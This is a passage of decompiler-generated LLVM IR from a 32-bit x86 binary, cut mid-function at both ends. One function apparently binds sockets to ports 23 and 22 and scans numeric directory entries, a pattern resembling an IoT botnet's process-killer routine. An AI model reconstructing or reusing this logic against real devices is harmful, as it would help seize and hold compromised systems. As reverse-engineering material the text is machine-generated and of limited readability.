  store i32 %v1_804db08, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804d783.outer

dec_label_pc_804db10:                             ; preds = %dec_label_pc_804d793, %dec_label_pc_804d78b
  %v1_804db10 = and i32 %v0_804db10, -256
  %v2_804db10 = or i32 %v1_804db10, 1
  br label %dec_label_pc_804d7a5

dec_label_pc_804db17:                             ; preds = %dec_label_pc_804d6fb, %dec_label_pc_804d6ec
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d711

dec_label_pc_804db27:                             ; preds = %dec_label_pc_804d80b
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db2e = call i32 @function_8051280(i8 6)
  store i32 %v3_804db2e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db3a = call i32 @function_8051280(i8 7)
  store i32 %v3_804db3a, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db46 = call i32 @function_8051280(i8 9)
  store i32 %v3_804db46, i32* %eax.global-to-local, align 4
  %v2_804db56.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804db4e

dec_label_pc_804db4e:                             ; preds = %dec_label_pc_804d694, %dec_label_pc_804db27
  %v2_804db56 = phi i32 [ %v0_804d5e3, %dec_label_pc_804d694 ], [ %v2_804db56.pre, %dec_label_pc_804db27 ]
  %v0_804db54 = load i32, i32* @ebx, align 4
  store i32 %v0_804db54, i32* %eax.global-to-local, align 4
  store i32 %v2_804db56, i32* @ebx, align 4
  store i32 %v0_804d5e2, i32* @esi, align 4
  store i32 %v0_804d5e1, i32* @edi, align 4
  store i32 %v0_804d5e0, i32* @ebp, align 4
  ret i32 %v0_804db54

dec_label_pc_804db62:                             ; preds = %dec_label_pc_804d871, %dec_label_pc_804d859
  %v2_804db65 = inttoptr i32 %v1_804d866 to i32*
  %v3_804db65 = load i32, i32* %v2_804db65, align 4
  store i32 %v3_804db65, i32* %edx.global-to-local, align 4
  %v3_804db69 = inttoptr i32 %v0_804d866 to i32*
  store i32 %v3_804db65, i32* %v3_804db69, align 4
  %v0_804db6a = call i32 @function_8052544()
  store i32 %v0_804db6a, i32* %eax.global-to-local, align 4
  %v0_804db6f = load i32, i32* @esp, align 4
  %v1_804db6f = add i32 %v0_804db6f, 20
  %v2_804db6f = inttoptr i32 %v1_804db6f to i8*
  %v3_804db6f = load i8, i8* %v2_804db6f, align 1
  %v4_804db6f = sext i8 %v3_804db6f to i32
  store i32 %v4_804db6f, i32* @ebx, align 4
  %v1_804db74 = add i32 %v0_804db6f, 16
  br label %dec_label_pc_804db77

dec_label_pc_804db77:                             ; preds = %dec_label_pc_804d82d, %dec_label_pc_804db62
  %v0_804db77 = phi i32 [ %v15_804d5e4, %dec_label_pc_804d82d ], [ %v1_804db74, %dec_label_pc_804db62 ]
  %v1_804db7a = add i32 %v0_804db77, -16
  %v2_804db7a = inttoptr i32 %v1_804db7a to i32*
  store i32 1, i32* %v2_804db7a, align 4
  %v1_804db7c = sext i8 %stack_var_-8769.2 to i32
  %v2_804db7c = call i32 @function_8053da0(i32 %v1_804db7c)
  store i32 %v2_804db7c, i32* %eax.global-to-local, align 4
  %v0_804db81 = load i32, i32* @esp, align 4
  %v1_804db81 = inttoptr i32 %v0_804db81 to i32*
  store i32 6, i32* %v1_804db81, align 4
  %v3_804db88 = call i32 @function_8051280(i8 %stack_var_-8769.2)
  store i32 %v3_804db88, i32* %eax.global-to-local, align 4
  %v0_804db8d = load i32, i32* @esp, align 4
  %v1_804db8d = inttoptr i32 %v0_804db8d to i32*
  store i32 7, i32* %v1_804db8d, align 4
  %v3_804db94 = call i32 @function_8051280(i8 %stack_var_-8769.2)
  store i32 %v3_804db94, i32* %eax.global-to-local, align 4
  %v0_804db99 = load i32, i32* @esp, align 4
  %v1_804db99 = inttoptr i32 %v0_804db99 to i32*
  store i32 9, i32* %v1_804db99, align 4
  %v3_804dba0 = call i32 @function_8051280(i8 %stack_var_-8769.2)
  %v0_804dba5 = load i32, i32* @esp, align 4
  %v0_804dba8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dba8, i32* %eax.global-to-local, align 4
  %v1_804dbaa = add i32 %v0_804dba5, 8780
  %v1_804dbb0 = inttoptr i32 %v1_804dbaa to i32*
  %v2_804dbb0 = load i32, i32* %v1_804dbb0, align 4
  store i32 %v2_804dbb0, i32* @ebx, align 4
  %v3_804dbb0 = add i32 %v0_804dba5, 8784
  %v1_804dbb1 = inttoptr i32 %v3_804dbb0 to i32*
  %v2_804dbb1 = load i32, i32* %v1_804dbb1, align 4
  store i32 %v2_804dbb1, i32* @esi, align 4
  %v3_804dbb1 = add i32 %v0_804dba5, 8788
  %v1_804dbb2 = inttoptr i32 %v3_804dbb1 to i32*
  %v2_804dbb2 = load i32, i32* %v1_804dbb2, align 4
  store i32 %v2_804dbb2, i32* @edi, align 4
  %v3_804dbb2 = add i32 %v0_804dba5, 8792
  %v1_804dbb3 = inttoptr i32 %v3_804dbb2 to i32*
  %v2_804dbb3 = load i32, i32* %v1_804dbb3, align 4
  store i32 %v2_804dbb3, i32* @ebp, align 4
  ret i32 %v0_804dba8

dec_label_pc_804dbb5:                             ; preds = %dec_label_pc_804d5e0
  %v3_804dbb5 = load i8, i8* %stack_var_-48, align 1
  %v4_804dbb5 = sext i8 %v3_804dbb5 to i32
  %v4_804dbcb = zext i8 %tmp47 to i32
  %v6_804dbcb = and i32 %v4_804dbb5, -256
  %v7_804dbcb = or i32 %v6_804dbcb, %v4_804dbcb
  store i32 %v7_804dbcb, i32* %eax.global-to-local, align 4
  store i8 48, i8* %stack_var_-48, align 1
  br label %dec_label_pc_804d694

dec_label_pc_804dbee:                             ; preds = %dec_label_pc_804d99d.backedge, %dec_label_pc_804d9b3, %dec_label_pc_804d99d.preheader
  %v0_804d9a6.lcssa = phi i32 [ %v0_804d9a685, %dec_label_pc_804d99d.preheader ], [ %v0_804d9a688, %dec_label_pc_804d9b3 ], [ %v0_804d9a6, %dec_label_pc_804d99d.backedge ]
  %v0_804dbf1 = load i32, i32* @ebp, align 4
  %v3_804dbf1 = inttoptr i32 %v0_804d9a6.lcssa to i32*
  store i32 %v0_804dbf1, i32* %v3_804dbf1, align 4
  %v0_804dbf2 = call i32 @function_8052544()
  store i32 %v0_804dbf2, i32* %eax.global-to-local, align 4
  %v0_804dbf7 = load i32, i32* @esp, align 4
  %v1_804dbf7 = add i32 %v0_804dbf7, 16
  br label %dec_label_pc_804d859

; uselistorder directives
  uselistorder i32 %v1_804db08, { 1, 0 }
  uselistorder i32 %v1_804daf8, { 2, 0, 1 }
  uselistorder i32 %v0_804d9a1, { 1, 0, 2 }
  uselistorder i32 %v0_804daca, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804da9d, { 0, 2, 1 }
  uselistorder i32 %v0_804d9a688, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v1_804d98b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804d90e, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804d883, { 0, 2, 1 }
  uselistorder i32 %v1_804d866, { 1, 0 }
  uselistorder i32 %v0_804d866, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_804d861, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804d859, { 1, 0 }
  uselistorder i32 %v4_804d833, { 1, 0, 2 }
  uselistorder i8 %stack_var_-8769.2, { 0, 2, 1, 3 }
  uselistorder i8* %.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804d7ef, { 1, 0 }
  uselistorder i32 %v3_804d7e7, { 1, 3, 2, 4, 0 }
  uselistorder i8 %v3_804d7ca, { 0, 2, 1 }
  uselistorder i32 %v1_804d7ca, { 0, 2, 1 }
  uselistorder i32 %v1_804d7a5, { 1, 0 }
  uselistorder i32 %storemerge4, { 0, 2, 1 }
  uselistorder i32 %v1_804d786, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %v7_804d783, { 0, 3, 1, 2 }
  uselistorder i32 %v0_804db10, { 1, 0, 2 }
  uselistorder i32 %v0_804daf8, { 3, 2, 0, 1 }
  uselistorder i8 %stack_var_-8769.1.ph, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804d735, { 0, 2, 1 }
  uselistorder i32 %v7_804d732, { 1, 0 }
  uselistorder i32 %v0_804d72f, { 1, 0 }
  uselistorder i32 %v4_804d6dc, { 1, 2, 0 }
  uselistorder i32 %v7_804d718, { 1, 0, 2 }
  uselistorder i32 %v1_804d72f, { 2, 0, 1, 3 }
  uselistorder i32 %v8_804d706, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804d705, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804d744, { 1, 0, 2 }
  uselistorder i32 %v2_804d66a, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v2_804d5ea, { 1, 2, 0, 3 }
  uselistorder i32 %v15_804d5e4, { 3, 0, 1, 2 }
  uselistorder i8* %stack_var_-561, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i8** %stack_var_-8796, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 1, 14, 13, 12, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8* %stack_var_-48, { 4, 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-32, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 91, 77, 78, 79, 80, 81, 82, 92, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder i32 (i8*, i32)* @function_8051d50, { 1, 0, 2, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8054aed.6 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8051e70, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804db77, { 1, 0 }
  uselistorder label %dec_label_pc_804db4e, { 1, 0 }
  uselistorder label %dec_label_pc_804d99d.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d9b3, { 1, 0 }
  uselistorder label %dec_label_pc_804d859, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804d80b.loopexit, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d6ec.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804d6d4.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804d783, { 1, 0 }
  uselistorder label %dec_label_pc_804d744, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d6d4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d711, { 1, 0 }
  uselistorder label %dec_label_pc_804d705, { 1, 0 }
  uselistorder label %dec_label_pc_804d694, { 1, 0 }
}

define i32 @function_804dc00() local_unnamed_addr {
dec_label_pc_804dc00:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-8388 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-8444 = alloca i32, align 4
  %stack_var_-8460 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8460, align 4
  %v2_804dc0c = call i32 @function_80524b2(i32* null)
  store i32 %v2_804dc0c, i32* %eax.global-to-local, align 4
  store i32 %v2_804dc0c, i32* @edi, align 4
  %v0_804dc13 = call i32 @function_805221f()
  store i32 %v0_804dc13, i32* %eax.global-to-local, align 4
  %v12_804dc18 = ptrtoint i32* %stack_var_-8444 to i32
  store i32 %v0_804dc13, i32* @global_var_8056964.21, align 4
  %tmp113 = icmp slt i32 %v0_804dc13, 1
  br i1 %tmp113, label %dec_label_pc_804dc2f, label %dec_label_pc_804dc24

dec_label_pc_804dc24:                             ; preds = %dec_label_pc_804de10, %dec_label_pc_804dce1, %dec_label_pc_804dc2f, %dec_label_pc_804dc00
  %v0_804dc2e = phi i32 [ -1, %dec_label_pc_804dce1 ], [ 0, %dec_label_pc_804dc2f ], [ %v0_804dc13, %dec_label_pc_804dc00 ], [ 0, %dec_label_pc_804de10 ]
  ret i32 %v0_804dc2e

dec_label_pc_804dc2f:                             ; preds = %dec_label_pc_804dc00
  %v1_804dc2f = add i32 %v0_804dc13, 1
  %v8_804dc2f = icmp eq i32 %v1_804dc2f, 0
  store i32 %v1_804dc2f, i32* %eax.global-to-local, align 4
  br i1 %v8_804dc2f, label %dec_label_pc_804dc24, label %dec_label_pc_804dc32

dec_label_pc_804dc32:                             ; preds = %dec_label_pc_804dc2f
  store i32 2, i32* %stack_var_-52, align 4
  store i32 5888, i32* %stack_var_-8460, align 4
  %v1_804dc4f = call i32 @function_804d5e0(i32 5888)
  store i32 %v1_804dc4f, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804dc67 = call i32 @function_80529e5(i32 2, i32 1, i32 0)
  store i32 %v3_804dc67, i32* %eax.global-to-local, align 4
  store i32 %v3_804dc67, i32* @ebx, align 4
  %v10_804dc71 = icmp eq i32 %v3_804dc67, -1
  br i1 %v10_804dc71, label %dec_label_pc_804dc94, label %dec_label_pc_804dc76

dec_label_pc_804dc76:                             ; preds = %dec_label_pc_804dc32
  %v2_804dc76 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804dc76, i32* %eax.global-to-local, align 4
  %v0_804dc7d = load i32, i32* @edx, align 4
  store i32 %v3_804dc67, i32* %stack_var_-8460, align 4
  %v4_804dc82 = call i32 @function_80527df(i32 %v3_804dc67, i32 %v2_804dc76, i32 16, i32 %v0_804dc7d)
  store i32 %v4_804dc82, i32* %eax.global-to-local, align 4
  %v2_804dc87 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dc87, i32* @esi, align 4
  store i32 %v2_804dc76, i32* @ebp, align 4
  %v0_804dc8b = load i32, i32* @ebx, align 4
  store i32 %v0_804dc8b, i32* %stack_var_-8460, align 4
  %v2_804dc8c = call i32 @function_805289b(i32 %v0_804dc8b, i32 1)
  store i32 %v2_804dc8c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc94

dec_label_pc_804dc94:                             ; preds = %dec_label_pc_804dc32, %dec_label_pc_804dc76
  store i32 5632, i32* %stack_var_-8460, align 4
  %v1_804dc9c = call i32 @function_804d5e0(i32 5632)
  store i32 %v1_804dc9c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804dcb4 = call i32 @function_80529e5(i32 2, i32 1, i32 0)
  store i32 %v3_804dcb4, i32* %eax.global-to-local, align 4
  store i32 %v3_804dcb4, i32* @ebx, align 4
  %v10_804dcbe = icmp eq i32 %v3_804dcb4, -1
  br i1 %v10_804dcbe, label %dec_label_pc_804dce1, label %dec_label_pc_804dcc3

dec_label_pc_804dcc3:                             ; preds = %dec_label_pc_804dc94
  %v2_804dcc3 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804dcc3, i32* %eax.global-to-local, align 4
  %v0_804dcca = load i32, i32* @ecx, align 4
  store i32 %v3_804dcb4, i32* %stack_var_-8460, align 4
  %v4_804dccf = call i32 @function_80527df(i32 %v3_804dcb4, i32 %v2_804dcc3, i32 16, i32 %v0_804dcca)
  %v2_804dcd4 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dcd4, i32* %eax.global-to-local, align 4
  %v0_804dcd8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dcd8, i32* %stack_var_-8460, align 4
  %v2_804dcd9 = call i32 @function_805289b(i32 %v0_804dcd8, i32 1)
  store i32 %v2_804dcd9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dce1

dec_label_pc_804dce1:                             ; preds = %dec_label_pc_804dc94, %dec_label_pc_804dcc3
  store i32 5, i32* %stack_var_-8460, align 4
  %v1_804dce6 = call i32 @function_8053da0(i32 5)
  store i32 %v1_804dce6, i32* %eax.global-to-local, align 4
  store i32 4096, i32* %stack_var_-8460, align 4
  %v1_804dcf2 = call i32 @function_8052b84(i32 4096)
  %v2_804dcf2 = inttoptr i32 %v1_804dcf2 to i8*
  store i32 %v1_804dcf2, i32* %eax.global-to-local, align 4
  store i32 %v1_804dcf2, i32* @global_var_8056960.22, align 32
  store i8 0, i8* %v2_804dcf2, align 1
  store i32 6, i32* %stack_var_-8460, align 4
  store i32 0, i32* @global_var_80568e0.23, align 32
  %v2_804dd10 = call i32 @function_8051300(i8 6)
  store i32 %v2_804dd10, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804dd1c = call i32 @function_8051300(i8 7)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v3_804dd27 = call i32 @function_8051250(i32 6, i32* null)
  %v2_804dd2c = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dd2c, i32* @ebx, align 4
  %v2_804dd2f = ptrtoint i32* %stack_var_-8388 to i32
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v2_804dd38 = bitcast i32* %stack_var_-8388 to i8*
  %v3_804dd38 = call i32 @function_8051c70(i8* %v2_804dd38, i32 %v3_804dd27)
  store i32 %v3_804dd38, i32* %eax.global-to-local, align 4
  %v2_804dd41 = add i32 %v3_804dd38, %v2_804dd2f
  store i32 %v2_804dd41, i32* @ebx, align 4
  %v0_804dd43 = call i32 @function_8052245()
  store i32 %v0_804dd43, i32* %eax.global-to-local, align 4
  %v2_804dd4b = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v0_804dd43, i32* %stack_var_-8460, align 4
  %v3_804dd56 = sext i32 %v0_804dd43 to i64
  %v4_804dd56 = call i32 @function_8052060(i64 %v3_804dd56, i32 10, i32 %v2_804dd4b)
  store i32 %v4_804dd56, i32* %eax.global-to-local, align 4
  %v0_804dd5e = load i32, i32* @ebx, align 4
  store i32 %v0_804dd5e, i32* %stack_var_-8460, align 4
  %v2_804dd5f = inttoptr i32 %v0_804dd5e to i8*
  %v3_804dd5f = call i32 @function_8051c70(i8* %v2_804dd5f, i32 %v4_804dd56)
  %v2_804dd64 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dd64, i32* @ebp, align 4
  %v0_804dd65 = load i32, i32* @ebx, align 4
  %v2_804dd65 = add i32 %v0_804dd65, %v3_804dd5f
  store i32 %v2_804dd65, i32* @ebx, align 4
  store i32 %v4_804dd56, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v3_804dd6c = call i32 @function_8051250(i32 7, i32* null)
  store i32 %v3_804dd6c, i32* %eax.global-to-local, align 4
  %v0_804dd74 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd74, i32* %stack_var_-8460, align 4
  %v2_804dd75 = inttoptr i32 %v0_804dd74 to i8*
  %v3_804dd75 = call i32 @function_8051c70(i8* %v2_804dd75, i32 %v3_804dd6c)
  store i32 %v3_804dd75, i32* @esi, align 4
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v3_804dd85 = call i32 @function_8052302(i8* %v2_804dd38, i32 0)
  store i32 %v3_804dd85, i32* %eax.global-to-local, align 4
  %v10_804dd8d = icmp eq i32 %v3_804dd85, -1
  br i1 %v10_804dd8d, label %dec_label_pc_804dc24, label %dec_label_pc_804dd96

dec_label_pc_804dd96:                             ; preds = %dec_label_pc_804dce1
  store i32 %v3_804dd85, i32* %stack_var_-8460, align 4
  %v1_804dd9a = call i32 @function_80521f1(i32 %v3_804dd85)
  store i32 %v1_804dd9a, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v2_804dda6 = call i32 @function_8051280(i8 6)
  store i32 %v2_804dda6, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804ddb2 = call i32 @function_8051280(i8 7)
  %v0_804ddba = load i32, i32* @global_var_8056960.22, align 32
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v4_804ddca = call i32 @function_80523c2(i8* %v2_804dd38, i32 %v0_804ddba, i32 4095)
  store i32 %v4_804ddca, i32* %eax.global-to-local, align 4
  %v10_804ddd4 = icmp eq i32 %v4_804ddca, -1
  br i1 %v10_804ddd4, label %dec_label_pc_804dde2, label %dec_label_pc_804ddd9

dec_label_pc_804ddd9:                             ; preds = %dec_label_pc_804dd96
  %v0_804ddd9 = load i32, i32* @global_var_8056960.22, align 32
  store i32 %v0_804ddd9, i32* %eax.global-to-local, align 4
  %v2_804ddde = add i32 %v0_804ddd9, %v4_804ddca
  %v3_804ddde = inttoptr i32 %v2_804ddde to i8*
  store i8 0, i8* %v3_804ddde, align 1
  br label %dec_label_pc_804dde2

dec_label_pc_804dde2:                             ; preds = %dec_label_pc_804dd96, %dec_label_pc_804ddd9
  %v0_804dde8 = load i32, i32* @ebx, align 4
  %v1_804dde8 = load i32, i32* @esi, align 4
  %v2_804dde8 = sub i32 %v0_804dde8, %v2_804dd2f
  %v2_804ddeb = add i32 %v2_804dde8, %v1_804dde8
  %v0_804dded = load i32, i32* @edi, align 4
  store i32 %v0_804dded, i32* @ebx, align 4
  store i32 400, i32* @esi, align 4
  store i32 %v2_804dd2f, i32* @eax, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v2_804ddfa = call i32 @function_8051ce0(i32 %v2_804dd2f, i32 %v2_804ddeb)
  store i32 %v2_804ddfa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804de10

dec_label_pc_804de10:                             ; preds = %dec_label_pc_804e043, %dec_label_pc_804dde2
  %storemerge8 = phi i32 [ %v1_804e050, %dec_label_pc_804e043 ], [ %v12_804dc18, %dec_label_pc_804dde2 ]
  %v1_804de13 = add i32 %storemerge8, -16
  %v2_804de13 = inttoptr i32 %v1_804de13 to i32*
  store i32 6, i32* %v2_804de13, align 4
  %v2_804de15 = call i32 @function_8051300(i8 0)
  store i32 %v2_804de15, i32* %eax.global-to-local, align 4
  %v0_804de1a = load i32, i32* @esp, align 4
  %v1_804de1a = inttoptr i32 %v0_804de1a to i32*
  %v2_804de1a = load i32, i32* %v1_804de1a, align 4
  store i32 %v2_804de1a, i32* %eax.global-to-local, align 4
  %v3_804de1a = add i32 %v0_804de1a, 4
  %v1_804de1b = inttoptr i32 %v3_804de1a to i32*
  store i32 0, i32* %v1_804de1b, align 4
  store i32 6, i32* %v1_804de1a, align 4
  %v3_804de20 = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804de20, i32* %eax.global-to-local, align 4
  %v1_804de25 = load i32, i32* @esp, align 4
  %v2_804de25 = inttoptr i32 %v1_804de25 to i32*
  store i32 %v3_804de20, i32* %v2_804de25, align 4
  %v1_804de28 = call i32 @function_80525b4(i32 0)
  store i32 %v1_804de28, i32* %eax.global-to-local, align 4
  %v1_804de2d = load i32, i32* @esp, align 4
  %v2_804de2d = add i32 %v1_804de2d, 32
  %v3_804de2d = inttoptr i32 %v2_804de2d to i32*
  store i32 %v1_804de28, i32* %v3_804de2d, align 4
  %v0_804de34 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de34 = icmp eq i32 %v0_804de34, 0
  br i1 %v1_804de34, label %dec_label_pc_804dc24, label %dec_label_pc_804de3c

dec_label_pc_804de3c:                             ; preds = %dec_label_pc_804de10
  %v0_804de31 = load i32, i32* @esp, align 4
  %v2_804de3f = inttoptr i32 %v0_804de31 to i32*
  store i32 6, i32* %v2_804de3f, align 4
  %v2_804de41 = call i32 @function_8051280(i8 0)
  store i32 %v2_804de41, i32* %eax.global-to-local, align 4
  %v0_804de46 = load i32, i32* @esp, align 4
  %v1_804de46 = add i32 %v0_804de46, 16
  br label %dec_label_pc_804de50

dec_label_pc_804de50:                             ; preds = %dec_label_pc_804e058, %dec_label_pc_804e064, %dec_label_pc_804de6a, %dec_label_pc_804e081, %dec_label_pc_804e038, %dec_label_pc_804deac, %dec_label_pc_804e31c, %dec_label_pc_804de3c
  %v0_804de50 = phi i32 [ %v1_804de46, %dec_label_pc_804de3c ], [ %v1_804e350, %dec_label_pc_804e31c ], [ %v1_804de9e, %dec_label_pc_804deac ], [ %v0_804e03a, %dec_label_pc_804e038 ], [ %v1_804e08b, %dec_label_pc_804e081 ], [ %v1_804de5d, %dec_label_pc_804de6a ], [ %v1_804de9e, %dec_label_pc_804e064 ], [ %v1_804de9e, %dec_label_pc_804e058 ]
  %v1_804de53 = add i32 %v0_804de50, 16
  %v2_804de53 = inttoptr i32 %v1_804de53 to i32*
  %v3_804de53 = load i32, i32* %v2_804de53, align 4
  store i32 %v3_804de53, i32* %eax.global-to-local, align 4
  %v2_804de57 = add i32 %v0_804de50, -16
  %v3_804de57 = inttoptr i32 %v2_804de57 to i32*
  store i32 %v3_804de53, i32* %v3_804de57, align 4
  %v0_804de58 = call i32 @function_80526a5()
  store i32 %v0_804de58, i32* %eax.global-to-local, align 4
  %v0_804de5d = load i32, i32* @esp, align 4
  store i32 %v0_804de58, i32* @edx, align 4
  %v1_804de62 = icmp eq i32 %v0_804de58, 0
  br i1 %v1_804de62, label %dec_label_pc_804e043, label %dec_label_pc_804de6a

dec_label_pc_804de6a:                             ; preds = %dec_label_pc_804de50
  %v1_804de5d = add i32 %v0_804de5d, 16
  %v1_804de6a = add i32 %v0_804de58, 11
  %v2_804de6a = inttoptr i32 %v1_804de6a to i8*
  %v3_804de6a = load i8, i8* %v2_804de6a, align 1
  %v4_804de6a = zext i8 %v3_804de6a to i32
  %v6_804de6a = and i32 %v0_804de58, -256
  %v7_804de6a = or i32 %v4_804de6a, %v6_804de6a
  %v1_804de6d = add i32 %v7_804de6a, -48
  %v8_804de6d = trunc i32 %v1_804de6d to i8
  store i32 %v1_804de6d, i32* %eax.global-to-local, align 4
  %v8_804de72 = icmp ugt i8 %v8_804de6d, 9
  br i1 %v8_804de72, label %dec_label_pc_804de50, label %dec_label_pc_804de74

dec_label_pc_804de74:                             ; preds = %dec_label_pc_804de6a
  store i32 %v1_804de6a, i32* @edi, align 4
  %v3_804de7a = inttoptr i32 %v0_804de5d to i32*
  store i32 %v1_804de6a, i32* %v3_804de7a, align 4
  %v0_804de7b = call i32 @function_8053bf6()
  store i32 %v0_804de7b, i32* %eax.global-to-local, align 4
  %v0_804de80 = load i32, i32* @esp, align 4
  store i32 %v0_804de7b, i32* @ebp, align 4
  %v1_804de85 = add i32 %v0_804de80, 28
  %v2_804de85 = inttoptr i32 %v1_804de85 to i32*
  %v3_804de85 = load i32, i32* %v2_804de85, align 4
  %v1_804de89 = add i32 %v3_804de85, 1
  store i32 %v1_804de89, i32* %eax.global-to-local, align 4
  %v0_804de8a = load i32, i32* @esi, align 4
  store i32 %v1_804de89, i32* %v2_804de85, align 4
  %v5_804de90 = icmp slt i32 %v0_804de8a, %v0_804de7b
  %v0_804deb3 = load i32, i32* @esp, align 4
  %v1_804deb6 = add i32 %v0_804deb3, -16
  %v2_804deb6 = inttoptr i32 %v1_804deb6 to i32*
  store i32 0, i32* %v2_804deb6, align 4
  %v2_804deb8 = call i32 @function_80524b2(i32* null)
  store i32 %v2_804deb8, i32* %eax.global-to-local, align 4
  br i1 %v5_804de90, label %dec_label_pc_804deb3, label %dec_label_pc_804de92

dec_label_pc_804de92:                             ; preds = %dec_label_pc_804de74
  %v1_804de9c = load i32, i32* @ebx, align 4
  %v2_804de9c = sub i32 %v2_804deb8, %v1_804de9c
  store i32 %v2_804de9c, i32* %eax.global-to-local, align 4
  %v0_804de9e = load i32, i32* @esp, align 4
  %v1_804de9e = add i32 %v0_804de9e, 16
  %v1_804dea1 = add i32 %v2_804de9c, -600
  %v6_804dea1 = sub i32 599, %v2_804de9c
  %v7_804dea1 = and i32 %v6_804dea1, %v2_804de9c
  %v8_804dea1 = icmp slt i32 %v7_804dea1, 0
  %v9_804dea1 = icmp eq i32 %v1_804dea1, 0
  %v10_804dea1 = icmp slt i32 %v1_804dea1, 0
  %v3_804dea6 = icmp ne i1 %v10_804dea1, %v8_804dea1
  %v4_804dea6 = or i1 %v9_804dea1, %v3_804dea6
  br i1 %v4_804dea6, label %dec_label_pc_804e058, label %dec_label_pc_804deac

dec_label_pc_804deac:                             ; preds = %dec_label_pc_804de92
  store i32 400, i32* @esi, align 4
  br label %dec_label_pc_804de50

dec_label_pc_804deb3:                             ; preds = %dec_label_pc_804de74
  store i32 %v2_804deb8, i32* %eax.global-to-local, align 4
  %v0_804debd = load i32, i32* @esp, align 4
  %v1_804debd = inttoptr i32 %v0_804debd to i32*
  store i32 6, i32* %v1_804debd, align 4
  %v1_804dec4 = load i32, i32* @esp, align 4
  %v2_804dec4 = add i32 %v1_804dec4, 24
  %v3_804dec4 = inttoptr i32 %v2_804dec4 to i32*
  store i32 %v2_804deb8, i32* %v3_804dec4, align 4
